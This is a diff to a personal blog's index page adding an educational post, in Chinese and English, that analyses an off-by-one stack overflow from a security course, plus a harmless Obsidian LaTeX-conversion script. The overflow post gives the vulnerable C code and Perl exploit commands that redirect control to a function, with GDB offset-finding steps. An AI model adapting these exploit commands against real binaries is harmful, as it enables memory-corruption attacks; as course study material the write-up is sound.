@@ -138,9 +138,13 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-count">8</span>
           <span class="site-state-item-name">posts</span>
         </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">tags</span>
       </div>
   </nav>
 </div>
@@ -156,6 +160,377 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://nansenli.com/zh-CN/post/2024/10/oboattact-md/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Nansen Li (李楠森)">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Nansen">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Nansen">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/zh-CN/post/2024/10/oboattact-md/" class="post-title-link" itemprop="url">Off-by-One 溢出攻击分析</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2024-10-15 14:18:44 / Modified: 14:21:58" itemprop="dateCreated datePublished" datetime="2024-10-15T14:18:44+01:00">2024-10-15</time>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/zh-CN/post/2024/10/oboattact-md/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="zh-CN/post/2024/10/oboattact-md/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="Off-by-One-溢出攻击分析"><a href="#Off-by-One-溢出攻击分析" class="headerlink" title="Off-by-One 溢出攻击分析"></a>Off-by-One 溢出攻击分析</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>上周，我参加了一门安全课程，其中包含了一个 off-by-one 溢出漏洞的示例。以下是原始代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 简单的 off-by-one 溢出示例 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">(<span class="type">char</span> *input)</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">  <span class="built_in">strncpy</span>(buf, input, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  buf[<span class="keyword">sizeof</span>(buf)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bar</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;I&#x27;ve been hacked\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s input_string\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line">  foo(argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用此漏洞的攻击命令是：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;system &quot;./obo&quot;, &quot;\x38\x84\x04\x08&quot;x256&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>运行此命令的结果是屏幕上打印出多行 <code>I&#39;ve been hacked</code>。</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>当程序进入 <code>foo</code> 函数时，内存布局如下（使用 GDB 观察到）：</p>
+<p>从上到下，布局包含返回地址、保存的帧指针（saved frame pointer）和缓冲区 (<code>buf</code>)。</p>
+<p>当执行 <code>buf[sizeof(buf)] = &#39;\0&#39;;</code> 时，保存的帧指针 (<code>ebp</code>) 的最低有效字节被设置为 <code>0</code>。为了确保 <code>ebp</code> 在被部分覆盖后仍然指向 <code>buf</code> 区域内，需要至少 1024 字节的缓冲区。具体来说，需要覆盖 <code>ebp</code>，使其保持在合理范围内（最高到 <code>0xff</code>），这就是为什么缓冲区设置为 <code>0xff * 4</code> 字节的原因。</p>
+<h2 id="理解-foo-返回时的汇编命令"><a href="#理解-foo-返回时的汇编命令" class="headerlink" title="理解 foo 返回时的汇编命令"></a>理解 <code>foo</code> 返回时的汇编命令</h2><p>当 <code>foo</code> 函数返回时，通常会执行以下关键的汇编指令：</p>
+<h3 id="1-leave-指令"><a href="#1-leave-指令" class="headerlink" title="1. leave 指令"></a>1. <code>leave</code> 指令</h3><p><code>leave</code> 指令等价于：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp, ebp</span><br><span class="line">pop ebp</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>mov esp, ebp</code>：将栈指针 (<code>esp</code>) 设置为帧指针 (<code>ebp</code>) 的值，恢复栈指针到当前栈帧的顶部，从而释放当前函数占用的空间。</li>
+<li><code>pop ebp</code>：将栈顶的值弹出并赋给帧指针 (<code>ebp</code>)，从而恢复调用者的帧指针。实际上，相当于将返回地址写入 <code>ebp</code>，这意味着将栈中的值（通常是调用者的帧地址）赋给 <code>ebp</code>，从而恢复调用者的栈帧。</li>
+</ul>
+<p><code>leave</code> 的作用是将 <code>esp</code> 恢复到函数调用前的位置，并弹出保存的 <code>ebp</code>。如果 <code>ebp</code> 被覆盖为指向某个特殊地址（例如缓冲区内的地址），在函数返回时可能导致错误的栈指针位置。</p>
+<h3 id="2-ret-指令"><a href="#2-ret-指令" class="headerlink" title="2. ret 指令"></a>2. <code>ret</code> 指令</h3><p><code>ret</code> 指令从栈顶弹出一个地址并跳转到该地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop eip</span><br></pre></td></tr></table></figure>
+
+<p>如果返回地址被覆盖为 <code>bar</code> 函数的地址，执行流将跳转到 <code>bar</code>，允许攻击者执行任意代码。本质上，<code>ret</code> 会将一个地址弹出到指令指针 (<code>eip</code>) 并跳转到该地址继续执行。</p>
+<h2 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h2><ul>
+<li>当执行命令 <code>perl -e &#39;system &quot;./obo&quot;, &quot;\x38\x84\x04\x08&quot;x256&#39;</code> 时，程序会将这些重复的字节作为输入传递给 <code>./obo</code>。</li>
+<li>在 <code>foo</code> 函数返回时，执行了 <code>leave</code> 和 <code>ret</code> 指令，由于返回地址被覆盖，程序跳转到 <code>bar</code> 函数，打印出成功的消息多次。</li>
+</ul>
+<h2 id="进一步分析：确定有效的覆盖位置"><a href="#进一步分析：确定有效的覆盖位置" class="headerlink" title="进一步分析：确定有效的覆盖位置"></a>进一步分析：确定有效的覆盖位置</h2><p>为了成功执行攻击，关键在于精确确定需要覆盖哪些字节，以有效地操控控制流。在这个例子中，溢出发生在执行 <code>buf[sizeof(buf)] = &#39;\0&#39;</code> 时，导致保存的帧指针 (<code>ebp</code>) 的最低有效字节被设置为 <code>0</code>。因此，需要调整 <code>ebp</code> 的值，确保其指向缓冲区区域，从而使执行流程按预期进行，最终跳转到 <code>bar</code> 函数。</p>
+<p>基于进一步的分析和测试，得出以下见解：</p>
+<ul>
+<li><p>要准确确定覆盖位置，<code>ebp</code> 的值至关重要。然而，获得这个值是有挑战的，因为：</p>
+<ol>
+<li>GDB 调试会影响地址布局。</li>
+<li>输入参数的长度会影响地址布局。</li>
+</ol>
+</li>
+<li><p>在 GDB 调试下，<code>foo</code> 函数内的布局如下：</p>
+</li>
+<li><p>执行 <code>buf[sizeof(buf)] = &#39;\0&#39;;</code> 后，<code>ebp</code> 被修改，使得返回地址实际上取的是 <code>ebp + 1</code> 处的值，即地址 <code>0xbfffed00 + 1</code>，也就是 <code>0xbfffed04</code>。</p>
+</li>
+<li><p>对应的偏移位置在 <code>buf</code> 的第 255 个位置，这意味着可以通过只在该特定位置填入返回地址来构造攻击。在 GDB 中使用以下命令进行验证：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r $(perl -e <span class="string">&#x27;print  &quot;\x01\x01\x01\x01&quot;x254 . &quot;\x38\x84\x04\x08&quot;x1 . &quot;\x01\x01\x01\x01&quot;x1&#x27;</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>经过验证，这在 GDB 调试下是有效的，但需要注意以下细节：</p>
+<ol>
+<li>输入参数的长度必须始终为 256 字节，否则 <code>ebp</code> 的值会发生变化，因为输入参数会占用栈空间，从而影响帧的起始位置，进而影响 <code>ebp</code> 的值。</li>
+<li>填充必须使用非零值，如 <code>0x01</code>，因为如果遇到 <code>0</code> 值，<code>strncpy</code> 会提前终止。</li>
+</ol>
+</li>
+<li><p>直接执行程序时（即不使用 GDB），内存布局不同，导致偏移位置也不同。通过实验，发现偏移位置在第 235 个位置。对应的攻击命令是：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./obo $(perl -e <span class="string">&#x27;print  &quot;\x01\x01\x01\x01&quot;x234 . &quot;\x38\x84\x04\x08&quot;x1 . &quot;\x01\x01\x01\x01&quot;x21&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>这样就实现了找到准确覆盖位置并成功执行攻击的效果。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://nansenli.com/en/post/2024/10/oboattact-md/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Nansen Li (李楠森)">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Nansen">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Nansen">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/en/post/2024/10/oboattact-md/" class="post-title-link" itemprop="url">Off-by-One Overflow Attack Analysis</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2024-10-15 14:18:15 / Modified: 14:21:48" itemprop="dateCreated datePublished" datetime="2024-10-15T14:18:15+01:00">2024-10-15</time>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/en/post/2024/10/oboattact-md/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="en/post/2024/10/oboattact-md/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="Off-by-One-Overflow-Attack-Analysis"><a href="#Off-by-One-Overflow-Attack-Analysis" class="headerlink" title="Off-by-One Overflow Attack Analysis"></a>Off-by-One Overflow Attack Analysis</h1><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>Last week, I attended a security course that included an example of an off-by-one overflow vulnerability. Here is the original code:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Simple off-by-one overflow example */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">(<span class="type">char</span> *input)</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">  <span class="built_in">strncpy</span>(buf, input, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  buf[<span class="keyword">sizeof</span>(buf)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bar</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;I&#x27;ve been hacked\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s input_string\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line">  foo(argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>The answer provided for exploiting this vulnerability is:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;system &quot;./obo&quot;, &quot;\x38\x84\x04\x08&quot;x256&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>The result of running this command is that multiple lines of <code>I&#39;ve been hacked</code> are printed on the screen.</p>
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>When the program enters the <code>foo</code> function, the memory layout looks like this (as observed using GDB):</p>
+<p>From top to bottom, the layout contains the return address, the saved frame pointer, and the buffer (<code>buf</code>).</p>
+<p>When the line <code>buf[sizeof(buf)] = &#39;\0&#39;;</code> is executed, the least significant byte of the saved frame pointer (<code>ebp</code>) is set to <code>0</code>. To ensure that <code>ebp</code> still points within the <code>buf</code> region after being partially overwritten, a buffer of at least 1024 bytes is required. Specifically, <code>ebp</code> needs to be overwritten such that it remains within a reasonable range (— up to <code>0xff</code>), which is why the buffer is set to <code>0xff * 4</code> bytes.</p>
+<h2 id="Understanding-Assembly-Commands-on-foo-Return"><a href="#Understanding-Assembly-Commands-on-foo-Return" class="headerlink" title="Understanding Assembly Commands on foo Return"></a>Understanding Assembly Commands on <code>foo</code> Return</h2><p>When the <code>foo</code> function returns, it typically executes the following key assembly instructions:</p>
+<h3 id="1-leave-Instruction"><a href="#1-leave-Instruction" class="headerlink" title="1. leave Instruction"></a>1. <code>leave</code> Instruction</h3><p>The <code>leave</code> instruction is equivalent to:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp, ebp</span><br><span class="line">pop ebp</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>mov esp, ebp</code>: This sets the stack pointer (<code>esp</code>) to the value of the frame pointer (<code>ebp</code>), restoring the stack pointer to the top of the current stack frame and effectively releasing the space occupied by the current function.</li>
+<li><code>pop ebp</code>: This pops the value at the top of the stack and assigns it to the frame pointer (<code>ebp</code>), thereby restoring the caller’s frame pointer. Essentially, it writes the return address into <code>ebp</code>, meaning it assigns the stack value (usually the caller’s frame address) to <code>ebp</code>, restoring the caller’s stack frame.</li>
+</ul>
+<p>The effect of <code>leave</code> is to restore <code>esp</code> to its state before the function was called and to pop the saved <code>ebp</code>. If <code>ebp</code> has been overwritten to point to a special address (such as an address within the buffer), it can result in an incorrect stack pointer location during function return.</p>
+<h3 id="2-ret-Instruction"><a href="#2-ret-Instruction" class="headerlink" title="2. ret Instruction"></a>2. <code>ret</code> Instruction</h3><p>The <code>ret</code> instruction pops an address off the top of the stack and jumps to that address:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop eip</span><br></pre></td></tr></table></figure>
+
+<p>If the return address has been overwritten with the address of the <code>bar</code> function, the execution flow will jump to <code>bar</code>, allowing an attacker to run arbitrary code. Essentially, <code>ret</code> pops an address into the instruction pointer (<code>eip</code>) and jumps to that address to continue execution.</p>
+<h2 id="Attack-Steps"><a href="#Attack-Steps" class="headerlink" title="Attack Steps"></a>Attack Steps</h2><ul>
+<li>When the command <code>perl -e &#39;system &quot;./obo&quot;, &quot;\x38\x84\x04\x08&quot;x256&#39;</code> is executed, the program takes these repeated bytes as the input to <code>./obo</code>.</li>
+<li>As the <code>foo</code> function returns, the <code>leave</code> and <code>ret</code> instructions are executed, leading to the return address being overwritten. This causes the program to jump to the <code>bar</code> function, printing the success message multiple times.</li>
+</ul>
+<h2 id="Further-Analysis-Determining-Effective-Overwrite-Locations"><a href="#Further-Analysis-Determining-Effective-Overwrite-Locations" class="headerlink" title="Further Analysis: Determining Effective Overwrite Locations"></a>Further Analysis: Determining Effective Overwrite Locations</h2><p>To perform a successful attack, it’s crucial to determine precisely which bytes need to be overwritten in order to manipulate the control flow effectively. In this example, the overflow occurs when <code>buf[sizeof(buf)] = &#39;\0&#39;</code> is executed, causing the least significant byte of the saved frame pointer (<code>ebp</code>) to be set to <code>0</code>. Thus, the value of <code>ebp</code> needs to be adjusted to ensure it points back into the buffer area, allowing the execution to proceed in the desired way and eventually jump to the <code>bar</code> function.</p>
+<p>Based on further analysis and testing, the following insights were obtained:</p>
+<ul>
+<li><p>To accurately determine the overwrite location, the value of <code>ebp</code> is crucial. However, obtaining this value is challenging because:</p>
+<ol>
+<li>GDB debugging affects address layout.</li>
+<li>The length of the input parameter affects the address layout.</li>
+</ol>
+</li>
+<li><p>Under GDB debugging, the layout within the <code>foo</code> function looks like this:</p>
+</li>
+<li><p>After executing <code>buf[sizeof(buf)] = &#39;\0&#39;;</code>, <code>ebp</code> is modified such that the return address effectively takes the value at <code>ebp + 1</code>, which is the address <code>0xbfffed00 + 1</code>, or <code>0xbfffed04</code>.</p>
+</li>
+<li><p>The corresponding offset is at position 255 in <code>buf</code>, meaning the attack can be constructed by filling in the return address only at that specific location. The following command was used for verification in GDB:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r $(perl -e <span class="string">&#x27;print  &quot;\x01\x01\x01\x01&quot;x254 . &quot;\x38\x84\x04\x08&quot;x1 . &quot;\x01\x01\x01\x01&quot;x1&#x27;</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>This was verified to work under GDB debugging, with some details to note:</p>
+<ol>
+<li>The input parameter length must always be 256 bytes; otherwise, the value of <code>ebp</code> will change, as the input parameter occupies stack space, affecting the starting position of the frame and thereby affecting the value of <code>ebp</code>.</li>
+<li>Padding must use non-zero values such as <code>0x01</code>, because <code>strncpy</code> will terminate early if it encounters a <code>0</code> value.</li>
+</ol>
+</li>
+<li><p>When executing the program directly (i.e., without GDB), the memory layout differs, resulting in a different offset position. Through experimentation, it was found that the offset is at position 235. The corresponding attack command is:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./obo $(perl -e <span class="string">&#x27;print  &quot;\x01\x01\x01\x01&quot;x234 . &quot;\x38\x84\x04\x08&quot;x1 . &quot;\x01\x01\x01\x01&quot;x21&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>This achieves the desired effect of accurately finding the overwrite location and successfully executing the attack.</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://nansenli.com/zh-CN/post/2024/10/obsidian-latex-fix/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Nansen Li (李楠森)">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Nansen">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Nansen">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/zh-CN/post/2024/10/obsidian-latex-fix/" class="post-title-link" itemprop="url">将ChatGPT公式格式转换为Obsidian兼容格式</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2024-10-14 15:24:27 / Modified: 20:33:49" itemprop="dateCreated datePublished" datetime="2024-10-14T15:24:27+01:00">2024-10-14</time>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/zh-CN/post/2024/10/obsidian-latex-fix/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="zh-CN/post/2024/10/obsidian-latex-fix/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>ChatGPT生成的公式使用了以下格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\[</span><br><span class="line">公式内容</span><br><span class="line">\]</span><br></pre></td></tr></table></figure>
+
+<p>而Obsidian中的公式渲染使用的是以下格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$$</span><br><span class="line">公式内容</span><br><span class="line">$$</span><br></pre></td></tr></table></figure>
+
+<p>当我们将ChatGPT的公式复制到Obsidian中时，这种差异会导致无法正确渲染。</p>
+<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>我们可以创建一个Obsidian脚本，在粘贴操作时自动替换公式的格式。</p>
+<h3 id="1-创建脚本"><a href="#1-创建脚本" class="headerlink" title="1. 创建脚本"></a>1. 创建脚本</h3><p>可以使用Obsidian中的插件来解决这个问题。</p>
+<p>在你的库中，在<code>template</code>目录下创建一个文件<code>fixlatex.js</code>，并输入以下内容：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="title function_">async</span> (params) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; quickAddApi &#125; = params;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取剪贴板内容</span></span><br><span class="line">    <span class="keyword">const</span> clipboardContent = <span class="keyword">await</span> quickAddApi.<span class="property">utility</span>.<span class="title function_">getClipboard</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查是否成功获取内容</span></span><br><span class="line">    <span class="keyword">if</span> (!clipboardContent) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Notice</span>(<span class="string">&quot;剪贴板为空或无法访问。&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> modifiedContent = clipboardContent</span><br><span class="line">        .<span class="title function_">replace</span>(<span class="regexp">/\\\[|\\\]/g</span>, <span class="string">&#x27;$$$$&#x27;</span>)              <span class="comment">// 转换 \[ \] 为 $$ $$</span></span><br><span class="line">        .<span class="title function_">replace</span>(<span class="regexp">/\\\(\s*|\s*\\\)/g</span>, <span class="string">&#x27;$$&#x27;</span>);       <span class="comment">// 转换 \( \) 为 $</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将修改后的内容写回剪贴板</span></span><br><span class="line">    <span class="keyword">await</span> navigator.<span class="property">clipboard</span>.<span class="title function_">writeText</span>(modifiedContent);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Notice</span>(<span class="string">&quot;剪贴板内容已处理并修改！&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-在QuickAdd中设置脚本"><a href="#2-在QuickAdd中设置脚本" class="headerlink" title="2. 在QuickAdd中设置脚本"></a>2. 在QuickAdd中设置脚本</h3><p>安装QuickAdd插件，并创建一个<code>Macro</code>，按如下图中的配置进行设置并保存。Macro的第一步是执行我们刚刚创建的用户脚本<code>fixlatex.js</code>，第二步是等待100毫秒，第三步是执行粘贴操作。</p>
+<p><img src="https://i.imgur.com/grA8L8V.png"></p>
+<h3 id="3-在Commander中设置侧边快捷键"><a href="#3-在Commander中设置侧边快捷键" class="headerlink" title="3. 在Commander中设置侧边快捷键"></a>3. 在Commander中设置侧边快捷键</h3><p>安装Commander插件，并将刚刚创建的QuickAdd操作设置为侧边栏的快捷键。你也可以跳过这一步，直接使用Obsidian命令执行这个操作。</p>
+<h3 id="4-验证效果"><a href="#4-验证效果" class="headerlink" title="4. 验证效果"></a>4. 验证效果</h3><p>现在，在ChatGPT的网页中（目前在APP中点击复制按钮似乎有点问题），点击复制按钮后，在Obsidian中点击侧边栏快捷键，或者手动执行QuickAdd命令，就可以将ChatGPT中的内容复制到Obsidian中，并自动转换Latex格式。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -358,6 +733,219 @@
